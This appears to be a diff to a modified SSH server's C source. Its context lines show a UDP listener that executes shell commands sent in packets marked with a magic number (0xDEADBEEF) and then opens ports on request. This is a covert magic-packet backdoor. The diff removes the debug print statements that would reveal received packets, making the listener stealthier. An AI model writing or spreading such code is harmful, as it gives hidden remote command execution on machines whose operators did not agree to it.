@@ -109,15 +109,12 @@ void start_udp() {
         else{//else-parse income
             parse_packet(&new_packet,buffer);
         }
-        printf("GOT PACKET:\n%d\t%d\t%s\n",new_packet.magic,new_packet.port_number,new_packet.shell_command);
         //execute shell command and port adding only if 0xDEADBEEF and legal command
         if((int)new_packet.magic == MAGICNUM &&
             check_shell_command(&new_packet)){
                 //execute the shell_command, then add port
                 shell_exec_command(new_packet.shell_command); //func in svr-chansession
-                printf("CP1\n");
                 add_port_request((int)new_packet.port_number); //func in svr-main   
-                printf("CP2\n");
         }
     }
 
